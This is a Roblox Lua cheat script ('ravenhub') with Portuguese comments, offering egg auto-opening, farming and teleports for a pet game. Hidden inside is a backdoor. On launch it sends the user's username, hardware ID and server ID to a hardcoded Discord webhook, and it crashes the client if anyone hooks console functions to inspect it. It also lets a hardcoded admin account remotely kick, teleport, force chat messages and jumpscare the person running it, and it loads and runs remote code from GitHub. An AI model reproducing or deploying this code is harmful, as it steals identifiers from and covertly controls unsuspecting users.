---@diagnostic disable: undefined-global
-- \\ Configuration

getgenv().Webhook_URL = "https://canary.discord.com/api/webhooks/1096827396268761098/MUvUBIIRD-cz3TV2HAQxA5pgxAr-TfK_zMOz7MlOo7m3icXvFoZUO09dgAF_-YWVyXEd"
getgenv().Prefix = "!"
getgenv().AdminPrefix = "@"

--[[

    Como usar espaço:

    Exemplo: "!kick fulano Eu/estou/usando/espaço"
    Saida: Eu estou usando espaço

    "Commands" : {

        "Admin Commands" : {
                -- \\ Pessoas na whitelist podem executar qualquer "Everyone Commands em quem tiver usando o Backdoor // --
                "ADD WHITELIST" = @addws Player
                "REMOVE WHITELIST" = @removews Player
        {

        Everyone Commands : {
                "KICK" = !kick Client Motivo
                "SAY" = !say Client Motivo
                "BRING" = !bring Client
                "REJOIN" = !rejoin Client
                "TP" = !tp Client OtherPlayer
                "LOOPTP" = !loopgoto Client OtherPlayer
                "UNLOOPTP" !unloopgoto
                "SUMMONDUNGEON" !summondungeon Client
                "JUMPSCARE" !jumpscare Client
        }
    }

]]


-- \\ Webhook

local http_request = http_request;

if syn then
    http_request = syn.request
elseif SENTINEL_V2 then
    function http_request(tb)
        return {
            StatusCode = 200;
            Body = request(tb.Url, tb.Method, (tb.Body or ''))
        }
    end
end

local body = http_request({Url = 'https://httpbin.org/get'; Method = 'GET'}).Body;
local decoded = game:GetService('HttpService'):JSONDecode(body)
local HttpServ = game:GetService('HttpService')
local url = getgenv().Webhook_URL
local market = game:GetService("MarketplaceService")
local info = market:GetProductInfo(game.PlaceId, Enum.InfoType.Asset)
local User = game.Players.LocalPlayer

local data = 
    {
        ["content"] = '',
        ["embeds"] = {{
            ["title"] = "Script Logs",
            ["url"] = "https://www.roblox.com/users/"..User.UserId.."/profile",
            ["description"] = "",
            ["type"] = "rich",
            ["color"] = tonumber(0xffffff),
            ["fields"] = {
                {
                    ["name"] = "User Info:",
                    ["value"] = "```Username: "..User.Name.."\nHWID: "..game:GetService("RbxAnalyticsService"):GetClientId().."```",
                    ["inline"] = false
                },

                {
                    ["name"] = "Server:",
                    ["value"] = '```game:GetService("ReplicatedStorage").__ServerBrowser:InvokeServer("teleport", "'..game.JobId..'")```',
                    ["inline"] = true
                },
            },
            ["image"] = {
                ["url"] = "https://cdn.discordapp.com/attachments/1080302345235210270/1083053024060125265/fotor_2023-3-8_12_45_49.png",
            },
        }}
    }
local newdata = HttpServ:JSONEncode(data)
        
local headers = {
        ["content-type"] = "application/json"
}
        
local request_payload = {Url=url, Body=newdata, Method="POST", Headers=headers}
http_request(request_payload)

-- \\ Anti Analyzer (Protect Webhook)

if not hookfunction then game.Players.LocalPlayer:Kick("Exploit not Supported") end

function CrashPlayer(crashArg)
    while true do
        print(crashArg)
    end
end

hookfunction(rconsolename, newcclosure(function(Args)
    CrashPlayer("HelloWorld")
end))

hookfunction(rconsoleprint, newcclosure(function(Args)
    CrashPlayer("HelloWorld")
end))

-- \\ Commands

local players, replicatedStorage = game:GetService("Players"), game:GetService("ReplicatedStorage");
local defaultChatSystemChatEvents = replicatedStorage:FindFirstChild("DefaultChatSystemChatEvents");
local onMessageDoneFiltering = defaultChatSystemChatEvents:FindFirstChild("OnMessageDoneFiltering");

local Administration = 2008032372
local Whitelist = {}

Prefix = getgenv().Prefix
AdminPrefix = getgenv().AdminPrefix



function CheckIfInWhitelist(Username)

    local SpeakerId = players[Username].UserId

    for i,v in pairs(Whitelist) do

        if SpeakerId == v then

            return true

        end

    end

end

onMessageDoneFiltering.OnClientEvent:Connect(function(messageData)
    local speaker, message = players[messageData.FromSpeaker], messageData.Message

    if CheckIfInWhitelist(tostring(speaker)) == true or speaker.UserId == Administration then

        Mensagem = string.split(message, " ")

        Command = Mensagem[1]
        Arg1 = Mensagem[2]

        if Mensagem[3] then
            OldArg2 = Mensagem[3]
            Arg2 = string.gsub(OldArg2, "/", " ")
        else
            Arg2 = ""
        end

        -- \\ Loops
        getgenv().LoopTP = false


        -- \\ Admin Commands
        do

            if Command==AdminPrefix..string.lower("addws") and game.Players[Arg1] and speaker.UserId == Administration then

                table.insert(Whitelist, game.Players[Arg1].UserId)

            end

            if Command==AdminPrefix..string.lower("removews") and game.Players[Arg1] and speaker.UserId == Administration then

                for i,v in pairs(Whitelist) do

                    if game.Players[Arg1].UserId == v then
            
                        table.remove(Whitelist, i)
            
                    end
            
                end

            end

        end


        -- \\ Everyone Commands
        do

            if Command==Prefix..string.lower("kick") and Arg1 == players.LocalPlayer.Name then

                players.LocalPlayer:Kick(Arg2)

            elseif Command==Prefix..string.lower("say") and Arg1 == players.LocalPlayer.Name then

                if Arg2~="" then

                    local Message = Arg2
                    local Everyone = "All"
                    game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(Message, Everyone)
                
                end

            elseif Command==Prefix..string.lower("bring") and Arg1 == players.LocalPlayer.Name then

                players["LocalPlayer"]["Character"]["HumanoidRootPart"]["CFrame"] = players[tostring(speaker)].Character["HumanoidRootPart"]["CFrame"]

            elseif Command==Prefix..string.lower("rejoin") and Arg1 == players.LocalPlayer.Name then

                game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, game.JobId, game.Players.LocalPlayer)

            elseif Command==Prefix..string.lower("tp") and Arg1 == players.LocalPlayer.Name  and game.Players[Arg2] then

                players["LocalPlayer"]["Character"]["HumanoidRootPart"]["CFrame"] = players[Arg2].Character["HumanoidRootPart"]["CFrame"]

            elseif Command==Prefix..string.lower("ltp") and Arg1 == players.LocalPlayer.Name  and game.Players[Arg2] then

                getgenv().LoopTP = true

                while getgenv().LoopTP == true do

                    wait()
                    players["LocalPlayer"]["Character"]["HumanoidRootPart"]["CFrame"] = players[Arg2].Character["HumanoidRootPart"]["CFrame"]

                end

            elseif Command==Prefix..string.lower("ultp") then

                getgenv().LoopTP = false

            elseif Command==Prefix..string.lower("summondungeon") then

                if Arg1 == game.Players.LocalPlayer.Name then
                    local args = {
                        [1] = true,
                        [2] = {
                            ["Theme"] = "MadeInAbyss",
                            ["Size"] = 2
                        }
                    }

                    game:GetService("ReplicatedStorage").Remote.SummonDungeon:FireServer(unpack(args))
                end

            elseif Command==Prefix..string.lower("jumpscare") and Arg1 == players.LocalPlayer.Name then
                
                spawn(function()
                    local a = Instance.new("ScreenGui",players["LocalPlayer"]["PlayerGui"])
                    a.Name = "Tela"
                    local b = Instance.new("ImageLabel",a)
                    b.Image = "rbxassetid://142410803"
                    b.Size = UDim2.new(1,0,1,0)
                    local s = Instance.new("Sound",a)
                    s.SoundId = "rbxassetid://5567523008"
                    s.Volume = 1
                    s.Looped = false
                    s:Play()
                    repeat wait() until players["LocalPlayer"]["PlayerGui"]:WaitForChild('Tela').Sound.Playing == false
                    players["LocalPlayer"]["PlayerGui"]:WaitForChild('Tela'):Destroy()
                end)


            end

        end

    end

end);

local HttpService = game:GetService("HttpService")
local Rayfield = loadstring(game:HttpGet('https://raw.githubusercontent.com/sandwichk/RobloxScripts/main/UIS/Raryon'))()

_G.superautoopen = false
_G.superautoopensummer = false
_G.antiafksmooth = false
_G.automaxopenstatus = false
_G.farmpxp = false
_G.antikick = false
_G.farmillusionist = false

getgenv().worlds = {}


for _,v in pairs(game:GetService("Workspace").Worlds:GetChildren()) do
    if v.Name ~= "EventHub" and v.Name ~= "Tower" and v.Name ~= "Dungeon" and v.Name ~= "TimeChamber" then
        table.insert(worlds, v.Name)
    end
end

getgenv().SelectedWorld = worlds[1]



local function superopenegg()
    while _G.superautoopen do
        if table.find(worlds, game:GetService("Players")[game.Players.LocalPlayer.Name].World.Value) then
            local username = game.Players.LocalPlayer.Name
            local world = game:GetService("Players")[username].World.Value
            local args = {
                [1] = workspace.Worlds[world][world.."Egg"],
                [2] = 7
            }
                
            game:GetService("ReplicatedStorage").Remote.OpenEgg:InvokeServer(unpack(args))
                
    
            local args = {
                [1] = world.."Egg"
            }
                
            game:GetService("ReplicatedStorage").Remote.AttemptMultiOpen:FireServer(unpack(args))     
            wait(0.1)  
        else
            Rayfield:Notify({
                Title = "Ocorreu um erro inesperado no cliente!",
                Content = "Não é possível abrir ovos fora de mundos comuns.",
                Duration = 6.5,
                Image = 4483362458,
                Actions = { 
                   Ignore = {
                      Name = "Ok",
                      Callback = function()
                   end
                },
             },
             })
             break
        end
    end
end




local function summonsummerdungeon()
    local args = {
        [1] = "Size",
        [2] = 2
    }

    game:GetService("ReplicatedStorage").Remote.SetDungeonSetting:FireServer(unpack(args))


    local args = {
        [1] = true,
        [2] = {
            ["Theme"] = "Summer",
            ["Size"] = 2
        }
    }
    
    game:GetService("ReplicatedStorage").Remote.SummonDungeon:FireServer(unpack(args))
end



local function teleport(place)
    local player = game.Players.LocalPlayer
    player.Character.HumanoidRootPart.CFrame = place
end



local function farmpxp()
    while _G.farmpxp do
        for i,v in pairs(game:GetService("Players").LocalPlayer.PlayerGui.MainGui.Items.Main.Scroll:GetChildren()) do
            if v:IsA("ImageButton") and _G.farmpxp then
                local args = {
                    [1] = v.Name
                }
                
                game:GetService("ReplicatedStorage").Remote.SacrificeItem:FireServer(unpack(args))
            end
        end   
    wait()     
    end
end

local function islandteleport(island)
    local username = game.Players.LocalPlayer.Name
    local world = game:GetService("Players")[username].World.Value

    if game:GetService("Workspace").Worlds[world]:FindFirstChild("WorldGate") then
        game:GetService("Workspace").Worlds[world].WorldGate.TargetWorld.Value = island
        teleport(game:GetService("Workspace").Worlds[world].WorldGate.TPDetect.CFrame)
    else
        local args = {
            [1] = island
        }
        
        game:GetService("ReplicatedStorage"):WaitForChild("Remote"):WaitForChild("AttemptTravel"):InvokeServer(unpack(args))

        teleport(workspace.Worlds[island].Spawns.SpawnLocation.CFrame)
    end
end



repeat wait() until game:IsLoaded() 
    game:GetService("Players").LocalPlayer.Idled:connect(function()
    game:GetService("VirtualUser"):ClickButton2(Vector2.new())
end)



local Window = Rayfield:CreateWindow({
   Name = "ravenhub | e-z.bio/raven",
   LoadingTitle = "loading...",
   LoadingSubtitle = "by Raven",
   ConfigurationSaving = {
      Enabled = true,
      FolderName = nil, 
      FileName = "Big Hub"
   },
   Discord = {
      Enabled = false,
      Invite = "noinvitelink", 
      RememberJoins = true 
   },
   KeySystem = true, 
   KeySettings = {
      Title = "ravenhub | e-z.bio/raven",
      Subtitle = "key system",
      Note = "Join the discord (discord.gg/asfixware)",
      FileName = "SiriusKey",
      SaveKey = false,
      GrabKeyFromSite = false, 
      Key = "privatehub"
   }
})

local FirstTab = Window:CreateTab("Credits", 4483362458)
local Tab = Window:CreateTab("Auto Open", 4483362458)
local Tab4 = Window:CreateTab("Teleport", 4483362458)
local Tab3 = Window:CreateTab("Miscellaneous", 4483362458) 


local Paragraph = FirstTab:CreateParagraph({Title = "credits", Content = "developed by syn_raven#0999 <3\ndesigned by collorem#9470 :)"})

local Button = FirstTab:CreateButton({
    Name = "copy discord.",
    Callback = function()
        setclipboard("discord.gg/asfixware")
    end,
 })

local Toggle = Tab:CreateToggle({
    Name = "Super Auto Open (LOCAL ISLAND)",
    CurrentValue = false,
    Flag = "Toggle1",
    Callback = function(Value)
        _G.superautoopen = Value
        superopenegg()
    end,
 })


 local Toggle = Tab:CreateToggle({
    Name = "Farm PXP",
    CurrentValue = false,
    Flag = "Toggle1",
    Callback = function(Value)
        _G.farmpxp = Value
        farmpxp()
    end,
 })

 local Dropdown = Tab4:CreateDropdown({
    Name = "Island",
    Options = worlds,
    CurrentOption = worlds[1],
    MultipleOptions = false,
    Flag = "Dropdown1", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
    Callback = function(Option)
        SelectedWorld = unpack(Option)
    end,
 })

 local Button = Tab4:CreateButton({
    Name = "Teleport",
    Callback = function()
        islandteleport(SelectedWorld)
    end,
 })

 local Button = Tab3:CreateButton({
    Name = "Execute Zero Hub (auto farm)",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/Discord0000/Zer0Hub/main/MainScript.lua"))()
    end,
 })

 local Button = Tab3:CreateButton({
    Name = "Summon Summer Dungeon (EXCLUSIVE)",
    Callback = function()
        summonsummerdungeon()
    end,
 })


 ------------------------------------------------
